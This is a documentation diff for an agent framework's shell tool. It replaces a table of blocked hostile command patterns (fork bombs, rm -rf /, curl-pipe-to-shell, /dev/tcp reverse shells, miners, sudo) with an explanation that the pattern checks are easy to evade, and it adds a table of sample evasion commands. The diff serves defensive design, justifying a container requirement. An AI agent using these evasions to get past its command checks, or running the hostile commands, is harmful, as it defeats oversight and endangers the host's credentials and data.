@@ -89,33 +89,45 @@ any attempt to escape (e.g., `../`) returns an error.
 **File tools** are sandboxed to the workspace directory. Paths are resolved and checked —
 symlink escapes, `../` traversals, and absolute paths outside workspace are all rejected.
 
-**Shell** has a two-layer security model:
+**Shell requires a container.** `system_tools()` refuses to build it unless the
+execution is containerized, because outside one it runs as the worker user —
+with that user's ssh keys, cloud credentials and `flux.toml`.
 
-1. **Baseline security checks** (non-overridable) — 12 hardcoded checks that always run
-   before any command executes. These cannot be disabled and protect against:
+```python
+@workflow.with_options(runner="docker")      # or "docker-airgapped"
+async def my_agent(ctx: ExecutionContext):
+    tools = system_tools(workspace="./workspace")
+```
 
-   | Check | Threats |
-   |-------|---------|
-   | Fork bomb | `:(){ :|:& };:`, `while true`, `for(;;)` |
-   | Destructive commands | `rm -rf /`, `mkfs`, `dd if=/dev/zero`, `wipefs` |
-   | System control | `shutdown`, `reboot`, `halt`, `init 0/6` |
-   | Protected files | Writes to `.env`, `.ssh/`, `.bashrc`, `.gitconfig`, credentials |
-   | Path traversal | `../` sequences, URL-encoded `%2e%2e` variants |
-   | Pipe to shell | `curl \| bash`, `wget \| sh`, download-and-execute patterns |
-   | Unicode injection | Zero-width spaces, right-to-left override, control characters |
-   | IFS injection | `IFS=` manipulation, null-byte injection |
-   | Env manipulation | `PATH=`, `LD_PRELOAD=`, `PYTHONPATH=` overrides |
-   | Privilege escalation | `sudo`, `su`, `chmod 777`, `chmod +s`, `chown root` |
-   | Network exfiltration | `nc -l`, reverse shells via `/dev/tcp/`, `socat` listeners |
-   | Crypto mining | `xmrig`, `minerd`, `cpuminer`, `stratum+tcp://` |
+The container runners set `FLUX_RUNNER_SANDBOXED=1` in the child; the tool reads
+it. For local development, opt out explicitly:
 
-   Blocked commands return a descriptive error (e.g., `"fork bomb detected"`) without
-   executing.
+```python
+tools = system_tools(workspace="./workspace", allow_unsandboxed_shell=True)
+```
 
-2. **Configurable blocklist** — regex patterns for organization-specific rules. Override
-   with `blocklist=[]` to disable the configurable layer (baseline checks still apply).
+Pass `include_shell=False` to build the file, search and directory tools without
+it — those enforce the workspace boundary themselves and need no container.
 
-For stronger isolation, run your Flux workflow inside a Docker container.
+### What the command checks are, and are not
+
+`run_security_checks` runs twelve pattern checks (fork bombs, `rm -rf /`,
+pipe-to-shell, privilege escalation and so on), and a configurable `blocklist`
+adds organization-specific patterns.
+
+**They are speed bumps, not a boundary.** The checks match the raw command
+string; `/bin/sh -c` performs quote removal, word splitting and expansion
+before anything executes, so the same command can be written to evade them:
+
+| Written as | Why the check misses it |
+|---|---|
+| `s'u'do -n id` | the privilege-escalation check needs a contiguous `sudo` |
+| `cd $HOME/.ssh && echo … >> authorized_keys` | the protected-files check needs the path adjacent to the redirect |
+| `curl -s http://host/x -o p && sh p` | the pipe-to-shell check needs a literal `\|` |
+| `awk 'BEGIN{system("id")}'` | matches no check at all |
+
+Treat them as protection against mistakes, not against an adversary. The
+container is what bounds a determined command, which is why shell needs one.
 
 ## Composing With Other Tools
 
